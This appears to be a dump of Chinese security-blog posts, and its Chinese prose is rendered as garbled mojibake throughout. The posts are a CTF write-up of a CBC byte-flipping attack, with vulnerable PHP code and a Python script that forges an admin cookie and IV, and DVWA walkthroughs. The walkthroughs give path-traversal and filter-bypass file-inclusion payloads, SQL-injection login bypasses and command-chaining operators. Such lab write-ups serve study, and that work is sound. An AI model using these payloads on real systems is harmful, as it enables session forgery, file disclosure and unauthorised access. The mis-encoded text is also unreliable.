ä»å¯†æ–‡ä¸­æå–å‡ºIVï¼Œç„¶åå°†å¯†æ–‡åˆ†ç»„â€”â€”&gt;ä½¿ç”¨å¯†é’¥å¯¹ç¬¬ä¸€ç»„çš„å¯†æ–‡è§£å¯†ï¼Œç„¶åå’ŒIVè¿›è¡Œxorå¾—åˆ°æ˜æ–‡â€”â€”&gt;ä½¿ç”¨å¯†é’¥å¯¹ç¬¬äºŒç»„å¯†æ–‡è§£å¯†ï¼Œç„¶åå’Œ2ä¸­çš„å¯†æ–‡xorå¾—åˆ°æ˜æ–‡â€”â€”&gt;é‡å¤2-3ï¼Œç›´åˆ°æœ€åä¸€ç»„å¯†æ–‡ æ”»å‡»åŸç†Ciphertext-N-1ï¼ˆå¯†æ–‡-N-1ï¼‰æ˜¯ç”¨æ¥äº§ç”Ÿä¸‹ä¸€å—æ˜æ–‡ï¼›è¿™å°±æ˜¯å­—èŠ‚ç¿»è½¬æ”»å‡»å¼€å§‹å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚å¦‚æœæˆ‘ä»¬æ”¹å˜Ciphertext-N-1ï¼ˆå¯†æ–‡-N-1ï¼‰çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åä¸ä¸‹ä¸€ä¸ªè§£å¯†åçš„ç»„å—å¼‚æˆ–ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸åŒçš„æ˜æ–‡äº†ã€‚æ³¨æ„åœ¨åŠ å¯†æ—¶ï¼Œæ˜æ–‡ä¸­çš„å¾®å°æ”¹å˜ä¼šå¯¼è‡´å…¶åçš„å…¨éƒ¨å¯†æ–‡å—å‘ç”Ÿæ”¹å˜ï¼Œè€Œåœ¨è§£å¯†æ—¶ï¼Œä»ä¸¤ä¸ªé‚»æ¥çš„å¯†æ–‡å—ä¸­å³å¯å¾—åˆ°ä¸€ä¸ªæ˜æ–‡å—ã€‚å› æ­¤ï¼Œè§£å¯†è¿‡ç¨‹å¯ä»¥è¢«å¹¶è¡ŒåŒ–ï¼Œè€Œè§£å¯†æ—¶ï¼Œå¯†æ–‡ä¸­ä¸€ä½çš„æ”¹å˜åªä¼šå¯¼è‡´å…¶å¯¹åº”çš„æ˜æ–‡å—å®Œå…¨æ”¹å˜å’Œä¸‹ä¸€ä¸ªæ˜æ–‡å—ä¸­å¯¹åº”ä½å‘ç”Ÿæ”¹å˜ï¼Œä¸ä¼šå½±å“åˆ°å…¶å®ƒæ˜æ–‡çš„å†…å®¹ã€‚ å‚è€ƒ:https://maplege.github.io/2018/11/19/CBC-reverse/ å¼‚æˆ–è¿ç®—123å·²çŸ¥A=B^Cå¯ä»¥å¾—åˆ°ç»“è®ºB=A^Cå¹¶ä¸”ä¹Ÿèƒ½å¾—åˆ°A^C^B=0 æ”»å‡»æ ¸å¿ƒ1234è®¾ç¬¬ä¸€å—çš„å¯†æ–‡ç¬¬4ä¸ªå­—èŠ‚è®¾ä¸ºå˜é‡Aï¼Œç¬¬äºŒå—çš„æ˜æ–‡ä¸­ç¬¬4ä¸ªå­—èŠ‚è®¾ä¸ºå˜é‡Cï¼Œåœ¨ç¬¬äºŒå—åŠ å¯†äº§ç”Ÿçš„ç¬¬4ä¸ªå­—èŠ‚è®¾ä¸ºå˜é‡Bå› ä¸ºA^B=Cï¼Œæ ¹æ®ç»“è®ºæœ‰B=A^Cå¦‚æœäººä¸ºå°†Aå˜é‡å€¼æ”¹å˜ä¸ºA^Cçš„ç»“æœï¼Œé‚£ä¹ˆå‚ä¸è¿ç®—åA^Bå°†ç­‰äºA^C^B=B^B=0ï¼Œç¬¬äºŒä¸ªäº§ç”Ÿçš„æ˜æ–‡çš„ç¬¬4ä¸ªå­—èŠ‚å°†å˜ä¸º0å¦‚æœå°†Aå˜é‡å€¼æ”¹å˜ä¸ºA^C^Xï¼ˆè¿™é‡ŒXæ˜¯ä»»æ„å­—ç¬¦ï¼‰ï¼Œé‚£ä¹ˆå‚ä¸è¿ç®—åï¼ŒA^Bå°†ç­‰äºA^C^X^B=B^X^B=Xï¼Œç¬¬äºŒä¸ªäº§ç”Ÿçš„æ˜æ–‡çš„ç¬¬4ä¸ªå­—èŠ‚å°†å˜ä¸ºXå­—ç¬¦ï¼Œè¿™æ ·ï¼Œç¬¬äºŒå—å¯†æ–‡å—è§£å¯†çš„ç»“æœå°±å¯æ§äº† å®è·µé¦–å…ˆå…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æºç å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªæœ‰æ–‡ä»¶ï¼Œæ‰“å¼€ä»¥åå‘ç°ï¼Œç”±äºä¸ç®¡æ€ä¹ˆæ‰“å¼€éƒ½æ˜¯ä¹±ç ï¼Œæ‰€ä»¥ç›´æ¥å¤åˆ¶äº†ç½‘ä¸Šwpçš„æºç : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//è®¾ç½®cookieçš„æµç¨‹è°ƒç”¨çš„å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªéšæœºçš„ivå’Œä½¿ç”¨è¯¥ivåŠ å¯†çš„postæäº¤çš„usernameå’Œpasswordçš„ç»“æœâ€”â€”cipherfunction login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));}//æ£€æŸ¥å‡½æ•°ï¼Œè¿™é‡Œæ˜¯å¯¹cookieä¸­cipherå’Œivè¿›è¡ŒCBCç¿»è½¬çš„åˆ©ç”¨ç‚¹function check_login(){ //å¦‚æœcookieä¸­è®¾ç½®äº†cipherå’Œivå‚æ•° if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){ //å°†cipherå’Œivå‚æ•°éƒ½è¿›è¡Œbase64è§£ç  $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); //è¿›è¡ŒCBCæ¨¡å¼çš„AESè§£å¯† if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ //å¯¹è§£å¯†ç»“æœè¿›è¡Œååºåˆ—åŒ–ï¼Œè®¾ç½®sessionä¸­çš„usernameä¸ºååºåˆ—åŒ–åæ•°ç»„ä¸­çš„usernameçš„å€¼ $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode('&quot;.base64_encode($plain).&quot;') can't unserialize&lt;/p&gt;&quot;); $_SESSION['username'] = $info['username']; }else{ die(&quot;ERROR!&quot;); } }}//æ ¹æ®sessionä¸­usernameå‚æ•°ï¼Œæ§åˆ¶æ˜¾ç¤ºç»“æœfunction show_homepage(){ //å¦‚æœsessionä¸­çš„usernameä¸ºadminï¼Œåˆ™è¿”å›flag if ($_SESSION[&quot;username&quot;]==='admin'){ echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; }else{ echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; } echo '&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;';}//æ£€æŸ¥æ˜¯å¦å¸¦æœ‰usernameå’Œpasswordå‚æ•°ï¼Œå¦‚æœæœ‰å‚æ•°ï¼Œè¿›å…¥è®¾ç½®cookieçš„è·¯å¾„//å¦‚æœæ²¡æœ‰è®¾ç½®å‚æ•°ï¼Œè¿›å…¥åˆ¤æ–­cookieè·¯å¾„if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $username = (string)$_POST['username']; $password = (string)$_POST['password']; //ä¸å…è®¸æäº¤çš„usernameä¸ºadmin if($username === 'admin'){ exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); }else{ $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); }}else{ //å¦‚æœsessionä¸­çš„usernameå­—æ®µå·²ç»å­˜åœ¨äº†ï¼Œæ—¢ç™»é™†è¿‡äº†ï¼Œåˆ™è¿›å…¥ if(isset($_SESSION[&quot;username&quot;])){ check_login(); show_homepage(); }else{ ................. } ä¸Šé¢è¯´ï¼Œä¸è®©æˆ‘ä»¬ç›´æ¥æäº¤adminï¼Œä½†æ˜¯åˆè¯´ç»“æœéœ€è¦adminï¼Œè”æƒ³åˆ°ä¸Šé¢çš„æ”»å‡»åŸç†ï¼Œæ”¹å˜è§£ç ä¸­çš„æŸä¸ªå­—èŠ‚ï¼ŒæŒ‡æŒ¥å½±å“è¯¥æ®µæ˜æ–‡ï¼Œä»¥åŠä¸‹ä¸€æ®µæ˜æ–‡å¯¹åº”çš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦æ„é€ xdminï¼Œæˆ–è€…axmminï¼Œç„¶åé€šè¿‡CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œæ˜¯çš„xè¿˜åŸä¸ºaæˆ–dã€‚ã€‚ã€‚ æ”»å‡»è¿‡ç¨‹ä»£ç ä¸­æ¶‰åŠåˆ°äº†åºåˆ—åŒ–ï¼Œæ•°ç»„åºåˆ—åŒ–ç»“æœå‚è€ƒå¦‚ä¸‹ï¼ˆè¿™é‡Œä½¿ç”¨ydminå’Œ123ä½œä¸ºusernameå’Œpasswordï¼‰ï¼š a:2:{s:8:&quot;username&quot;;s:5:&quot;ydmin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;}åˆ°è¿™é‡Œï¼Œç®—æ˜¯å¤§è‡´ç†è§£è¿™ä¸ªCBCç¿»è½¬å­—èŠ‚æ”»å‡»æ˜¯å¦‚ä½•å®ç°çš„äº†ï¼Œé¦–å…ˆæˆ‘ä»¬çŸ¥é“å‰ä¸€æ®µå¯†æ–‡ä¼šå½±å“åä¸€æ®µæ˜æ–‡çš„è§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯¹ç¬¬ä¸€æ®µa:2:{s:8:&quot;usernaçš„å¯†æ–‡è¿›è¡Œä¿®æ”¹ï¼Œä½¿å¾—åœ¨äºç¬¬äºŒæ®µå¯†æ–‡å¼‚æˆ–è¿ç®—æ—¶ydminå˜æˆadminè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å°†ä¿®æ”¹åçš„å¯†æ–‡ç›´æ¥æ‹¿å»ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºè¿™ä¸ªæ—¶å€™IVæ²¡æœ‰æ›´æ¢ï¼Œå‰é¢çš„æ•°æ®ä¼šå‡ºç°åŒ¹é…ä¹±ç æˆ‘ä»¬çŸ¥é“ ç¬¬ä¸€èŠ‚æ˜æ–‡=IV^ç¬¬ä¸€èŠ‚å¯†æ–‡æ‰€ä»¥ æ–°IV=ç¬¬ä¸€èŠ‚æ˜æ–‡^ç¬¬ä¸€èŠ‚å¯†æ–‡ï¼ˆä¿®æ”¹ä¹‹å‰çš„ï¼Œå› ä¸ºä¿®æ”¹ä¹‹å‰çš„å¯†æ–‡æ‰€å¯¹åº”çš„æ˜æ–‡æ‰æ˜¯æ­£ç¡®çš„ï¼‰ ç¼–å†™è„šæœ¬123456789101112131415161718192021222324import base64import urllibcipher=&quot;ut%2F2iZbrbm1dq9PpRb0dUGN5xneMrTkNo1pMCTL6DjhABvPsODND9N%2BLwENXWiXXPyy5PQ7YXn2HCfcIkYNAIw%3D%3D&quot;iv=&quot;Ub5Pn6gmMNuctLwfJggaOA%3D%3D&quot;cipher_de=base64.b64decode(urllib.unquote(cipher))tran='a:2:{s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:3:&quot;123&quot;}8:&quot;passwor'#tran[16:32]=me&quot;;s:5:&quot;bdmin&quot;;# è¿™é‡Œç”¨ä¹‹å‰çš„æ”»å‡»æ ¸å¿ƒçš„å­—æ¯æ¥æŒ‡ä»£ä¸€ä¸‹ A ^ c ^ x cipher_new=cipher_de[0:9]+chr(ord(cipher_de[9])^ord('b')^ord('a'))+cipher_de[10:]cipher_new=urllib.quote(base64.b64encode(cipher_new))print(cipher_new)cipher_new=base64.b64decode('wXAR7J/AKHmukMZ9U0lgO21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==')#è¿™é‡Œè®°å¾—ç”¨burpè·‘å‡ºæ¥çš„é‚£ä¸ªï¼Œä¸ç„¶å¾…ä¼šåˆè§£ç ä¸å»åˆã€‚print(cipher_new)iv_raw=base64.b64decode(urllib.unquote(iv))iv_new=''for i in range(0,16):# iv_new+=chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))iv_new=urllib.quote(base64.b64encode(iv_new))print(iv_new) æœ€åä¹Ÿç»ˆäºæ˜¯æ‹¿åˆ°äº†flag å°ç»“ä¸€å¼€å§‹åšçš„æ—¶å€™ï¼Œå°±çœ‹ä¸ä¸‹å»äº†ï¼Œå› ä¸ºæ„Ÿè§‰å¾ˆé™Œç”Ÿï¼Œè€Œä¸”åˆæ„Ÿè§‰å¾ˆç»•ï¼Œä½†å…¶å®åªè¦ä¸“æ³¨çœ‹ä¸€ä¼šï¼Œå…¶å®å¾ˆå¿«å°±å¯ä»¥ç†è§£äº†å¡äº†æ¯”è¾ƒä¹…çš„åœ°æ–¹æ˜¯ï¼Œåˆ é™¤ä¸‹é¢post çš„å†…å®¹çš„æ—¶å€™ï¼ŒæŠŠé‚£ä¸€è¡Œåˆ æ‰å°±è¡Œäº†ï¼Œä¸è¦ä¸è¦æŠŠé‚£ä¸€è¡Œä¸Šé¢é‚£è¡Œç©ºç™½çš„ä¹Ÿåˆ æ‰ï¼Œè¿™æ ·æ˜¯è·‘ä¸å‡ºæ¥çš„ï¼Œæ¯æ¬¡éƒ½æ‰‹è´±ç›´æ¥æ•´ä¸ªåˆ æ‰ï¼Œç„¶åå°±å¥½ä¹…éƒ½æ²¡å‡ºæ¥ç»“æœï¼Œæ— è¯­äº†ã€‚ã€‚å‚è€ƒ:https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&amp;depth_1-utm_source=distribute.pc_relevant.no https://www.jianshu.com/p/a958f757a2b2","link":"/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"},{"title":"DVWA-file including","text":"å…¶å®å·²ç»åšè¿‡å¥½å¤šæ–‡ä»¶åŒ…å«çš„ç»ƒä¹ ï¼Œä½†æ˜¯éƒ½æ˜¯æ¯”è¾ƒé›¶ç¢çš„é¢˜ç›®è¿™æ¬¡å°±æ•´ä½“ä¸€èµ·æ¥æ€»ç»“ä¸€ä¸‹å§ï¼š æ–‡ä»¶åŒ…å«æ¼æ´ç®€ä»‹1.æ–‡ä»¶åŒ…å«å¯ä»¥åˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ä¸¤ç§ã€‚æ–‡ä»¶åŒ…å«å’Œæ–‡ä»¶ä¸Šä¼ ä¸€æ ·æœ¬èº«å¹¶ä¸æ˜¯æ¼æ´ï¼Œè€Œæ˜¯æ”»å‡»è€…åˆ©ç”¨äº†åŒ…å«çš„ç‰¹æ€§åŠ ä¸Šäº†åº”ç”¨æœ¬èº«å¯¹æ–‡ä»¶æ§åˆ¶ä¸ä¸¥æ ¼ï¼Œå¯¹includeè¿›æ¥çš„æ–‡ä»¶ä¸å¯æ§ï¼Œæ‰å¯¼è‡´äº†ä¸€ç³»åˆ—çš„å±å®³2.æœ¬åœ°æ–‡ä»¶åŒ…å«å°±æ˜¯é€šè¿‡URLå°†æœåŠ¡å™¨æœ¬åœ°çš„å…¶ä»–æ–‡ä»¶includeè¿›æ¥ã€‚è¿œç¨‹æ–‡ä»¶åŒ…å«å°±æ˜¯å°†è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶includeè¿›æ¥3.æœ€ä¸»è¦çš„æ˜¯ï¼ŒåŒ…å«è¿›æ¥çš„æ–‡ä»¶éƒ½æ˜¯ä»¥å½“å‰è„šæœ¬æ–‡ä»¶è§£æï¼Œä¾‹å¦‚åœ¨apache+PHPç¯å¢ƒï¼Œé‚£ä¹ˆè¢«includeè¿›æ¥çš„æ–‡ä»¶ï¼Œä¸ç®¡æ˜¯ä»€ä¹ˆç±»å‹ï¼Œä¾‹å¦‚å›¾ç‰‡ï¼Œæ–‡æœ¬æ–‡æ¡£ï¼Œéƒ½ä¼šè¢«å½“æˆphpè„šæœ¬æ¥è§£æ æœ¬åœ°æ–‡ä»¶åŒ…å«é€šè¿‡æµè§ˆå™¨åŒ…å«webæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´æ˜¯å› ä¸ºæµè§ˆå™¨åŒ…å«æ–‡ä»¶æ—¶æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå…è®¸éå†ç›®å½•çš„å­—ç¬¦æ³¨å…¥æµè§ˆå™¨å¹¶æ‰§è¡Œæ€»çš„æ¥è¯´å°±æ˜¯è¢«åŒ…å«çš„æ–‡ä»¶å†æœåŠ¡å™¨æœ¬åœ° è¿œç¨‹æ–‡ä»¶åŒ…å«åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šé¢„å…ˆè®¾ç½®å¥½çš„è„šæœ¬ï¼Œç„¶åæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶ï¼Œè¿™ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸ºæµè§ˆå™¨å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´ä¸åŒç¨‹åº¦çš„ä¿¡æ¯æ³„éœ²ï¼Œæ‹’ç»æœåŠ¡æ”»å‡»ï¼Œç”šè‡³åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»£ç ç®€å•çš„è¯´ï¼Œå°±æ˜¯è¢«åŒ…å«çš„æ–‡ä»¶åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ å¸¸è§å‡½æ•°1234567Include()å½“åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶æ—¶ï¼ŒåŒ…å«çš„å¤–éƒ¨æ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼Œç³»ç»Ÿä¼šç»™å‡ºè­¦å‘Šï¼Œä½†æ•´ä¸ªphpæ–‡ä»¶è¿˜ä¼šç»§ç»­æ‰§è¡Œã€‚Require()require()ä¸ include()çš„åŒºåˆ«åœ¨äº require()æ‰§è¡Œå¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œå‡½æ•°ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œã€‚include_once()å’Œincludeæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåªæ˜¯åœ¨å¯¼å…¥å‡½æ•°ä¹‹å‰å…ˆæ£€æµ‹ä¸‹è¯¥æ–‡ä»¶æ˜¯å¦è¢«includeè¿‡ï¼Œå¦‚æœå·²ç»æ‰§è¡Œäº†ä¸€éï¼Œé‚£ä¹ˆå°±ä¸åœ¨è¿›è¡Œç¬¬äºŒæ¬¡çš„includeæ“ä½œã€‚require_once()åŠŸèƒ½ä¸ require()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ å°tips12345/ æ ¹ç›®å½•./ æ˜¯å½“å‰ç›®å½•../ è¿”å›åˆ°ä¸Šä¸€çº§ç›®å½•../../ è¿”å›äº†ä¸¤çº§ç›®å½•.\\ ã€..\\å’Œ./ã€../æ„ä¹‰ç›¸åŒ DVWAç»ƒä¹ lowæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼šåœ¨lowçº§åˆ«ä¸­ 123&lt;?php $file = $_GET[ 'page' ]; ?&gt; è¿™ä¸ªå¯¹getçš„pageæ²¡æœ‰ä»»ä½•è¿‡æ»¤ 123456if( isset( $file ) ) include( $file );else { header( 'Location:?page=include.php' ); exit;} åœ¨index.phpæ–‡ä»¶ä¸­å‘ç°inlude() æ‰€ä»¥æœ‰æ–‡ä»¶åŒ…å«æ¼æ´æ„å»º 1?page=../../phpinfo.php æœ‰çš„äººä¼šé—®ï¼Œä½ æ€ä¹ˆçŸ¥é“ä¸Šç§»ä¸¤çº§å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Ÿå½“ç„¶ä¸çŸ¥é“å‘€ï¼Œè¯•å‡ºæ¥çš„ è¿œç¨‹æ–‡ä»¶åŒ…å«æˆ‘ä»¬ç°åœ¨æˆ‘ä»¬wwwä¸‹æ„å»ºä¸€ä¸ªæ–‡ä»¶ç„¶åé€šè¿‡è¾“å…¥URLè¿›è¡Œæ‰“å¼€è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ–‡ä»¶åä¸èƒ½åŒ…å«ç©ºæ ¼ä¹‹ç±»çš„å­—ç¬¦ï¼Œä¸ç„¶åˆ°æ—¶å€™ä¼šè¢«è¢«ç¼–ç æˆ%20åè€Œæ‰¾ä¸åˆ°æ–‡ä»¶äº† medium1$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); åœ¨è¿™ä¸ªå…³å¡ä¸­ï¼Œä½¿ç”¨äº†ä¸¤ä¸ªæ­£åˆ™è¿‡æ»¤äº†ä»¥ä¸Šå­—ç¬¦ æœ¬åœ°æ–‡ä»¶åŒ…å«å°è¯•ä¸€ä¸‹ä½¿ç”¨å¤å†™çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š 1?page=..././..././phpinfo.php å¥½çš„ç»•è¿‡æˆåŠŸ æ„Ÿè§‰è¿‡æ»¤ç»•è¿‡çš„æ–¹æ³•éƒ½å¾ˆåƒï¼Œæ‰€ä»¥è¦ç»å¸¸å¤ä¹ ï¼ è¿œç¨‹æ–‡ä»¶åŒ…å«1payloadï¼š?page=Http://url //åœ¨è¿™é‡Œä¹Ÿæ˜¯ç›´æ¥é‡‡å–å¤§å°å†™æ‹¼æ¥ï¼Œæˆ–è€…å¤å†™éƒ½å¯ä»¥ high12345if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { echo &quot;ERROR: File not found!&quot;; exit; } fnmatch() å‡½æ•°æ ¹æ®æŒ‡å®šçš„æ¨¡å¼æ¥åŒ¹é…æ–‡ä»¶åæˆ–å­—ç¬¦ä¸²ã€‚è¿™é‡Œä½¿ç”¨fnmatchæ£€æŸ¥pageå‚æ•°ï¼Œå¿…é¡»æ˜¯file*é—®ï¼šfile*æ˜¯ä»€ä¹ˆç±»å‹ï¼Ÿè¿™é‡ŒæŒ‡çš„æ˜¯éœ€è¦fileåè®®ç±»å‹:å®šä¹‰æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®® ,fileåè®®ä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶.fileåè®®çš„æ ¼å¼ï¼š 1file:///+ç»å¯¹è·¯å¾„ https://www.cnblogs.com/lishanlei/p/9327646.htmlæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„æ‰è¡Œï¼Œä¸èƒ½åœ¨ä½¿ç”¨../é€€æ ¼ impossibleéš¾åº¦ç›´æ¥ç™½åå•ï¼Œç®€å•ç²—æš´æ²¡å•¥å¥½è¯´â€“ å°ç»“å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘è§‰å¾—å¾ˆå¤§çš„ä½œç”¨æ˜¯è·å–è·¯å¾„ä¿¡æ¯æˆ–è€…å…¶ä»–æœ‰ç”¨ä¿¡æ¯ä¸ºæ–‡ä»¶ä¸Šä¼ get shell åšå‡†å¤‡1.æŠ¥é”™äº§ç”Ÿæ–‡ä»¶è·¯å¾„2.é€šè¿‡å·²æœ‰çš„è·¯å¾„ï¼ŒçŒœè§£æœåŠ¡å™¨ç»å¯¹è·¯å¾„","link":"/2021/01/23/DVWA-file-including/"},{"title":"DVWAé¶åœº","text":"Brute Forcelowï¼šæš´åŠ›ç ´è§£â€”â€”burpsuitå»è·‘å°±è¡Œäº†æˆ–è€…ä½¿ç”¨sqlæ³¨å…¥ï¼šadminâ€™|| 1=â€™1ã€adminâ€™# mediumä½¿ç”¨äº†mysql_real_escape_stringå‡½æ•°è¿›è¡Œè¿‡æ»¤å¤ä¹ ä¸€ä¸‹è¿‡æ»¤äº†å•¥ å›æƒ³ä¸€ä¸‹å½“æ—¶æ˜¯æ€ä¹ˆbypassçš„ï¼Ÿ å› ä¸ºé‚£ä¸€å…³æœ‰ç”¨gbkè¿›è¡Œç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥çš„æ–¹å¼åƒæ‰\\ è¿™é‡Œæ²¡æœ‰çœ‹åˆ°GBKç¼–ç  æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç»§ç»­ä½¿ç”¨burp suitè·‘å­—å…¸ è¿™è¾¹æœ‰ä¸ªç¡çœ ä¸¤ç§’çš„æ”¾çˆ†ç ´æœºåˆ¶ï¼Ÿæ„Ÿè§‰å¥½åƒè›®é¸¡è‚‹çš„ï¼Œå°±æ˜¯ç­‰çš„æ—¶é—´é•¿ç‚¹è€Œå·²ï¼Œæœ€åè¿˜æ˜¯èƒ½è·‘å‡ºæ¥çš„ highé™¤äº†åœ¨åŸç”±çš„é˜²sqlæ³¨å…¥çš„åŸºç¡€ä¸Šåˆæ·»åŠ äº†stripslasheså‡½æ•°â€”â€”ç”¨äºå»é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œçº¿å­—ç¬¦,å¦‚æœæœ‰ä¸¤ä¸ªè¿ç»­çš„åæ–œçº¿,åˆ™åªå»æ‰ä¸€ä¸ªï¼Œæ‰€ä»¥sqlæ³¨å…¥ä¼¼ä¹å˜å¾—ä¸å¤ªå¯èƒ½äº†burpsuitæš´åŠ›ç ´è§£ä¹Ÿä¸è¡Œï¼Œå› ä¸ºå®ƒæ¯æ¬¡éƒ½éœ€è¦æäº¤ä¸€ä¸ªä¸åŒçš„tokenæ‰€ä»¥è¿™é‡Œåªèƒ½ç”¨è„šæœ¬æ¥æš´åŠ›ç ´è§£ï¼šè„šæœ¬çš„ç¼–å†™è¿˜æ²¡å­¦å®Œï¼Œç­‰å­¦å®Œå†æ¥è¡¥å…… Command Injectionå‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œçš„åŸç†åˆ†ææœ‰äº›ä¼šéœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œæ¯”å¦‚PHPä¸­çš„ï¼šsystem ï¼Œ exec ï¼Œ shell_exec ï¼Œ passthru ï¼Œ popen ï¼Œ proc_popen ç­‰å‡½æ•°â€¦å¦‚æœç”¨æˆ·å¯ä»¥æ§åˆ¶è¿™äº›å‡½æ•°çš„å‚æ•°ï¼Œé‚£ä¹ˆæŠŠå‚æ•°æ›¿æ¢æˆè‡ªå·±çš„æ¶æ„å‘½ä»¤ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥æ“ä½œç³»ç»Ÿä¸€äº›å‘½ä»¤äº†ï¼Ÿè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œã€‚ å‘½ä»¤è¡Œæ³¨å…¥ å‘½ä»¤æ³¨å…¥æ”»å‡»çš„å¸¸è§æ¨¡å¼ä¸ºï¼šä»…ä»…éœ€è¦è¾“å…¥æ•°æ®çš„åœºåˆï¼Œå´ä¼´éšç€æ•°æ®åŒæ—¶è¾“å…¥äº†æ¶æ„ä»£ç ï¼Œè€Œè£…è½½æ•°æ®çš„ç³»ç»Ÿå¯¹æ­¤å¹¶æœªè®¾è®¡è‰¯å¥½çš„è¿‡æ»¤è¿‡ç¨‹ï¼Œå¯¼è‡´æ¶æ„ä»£ç ä¹Ÿä¸€å¹¶æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´ä¿¡æ¯æ³„éœ²æˆ–è€…æ­£å¸¸æ•°æ®çš„ç ´åã€‚å‘½ä»¤è¿æ¥ç¬¦command1 &amp;&amp; command2 å…ˆæ‰§è¡Œcommand1åæ‰§è¡Œcommand2command1 | command2 åªæ‰§è¡Œcommand2command1 &amp; command2 å…ˆæ‰§è¡Œcommand2åæ‰§è¡Œcommand1 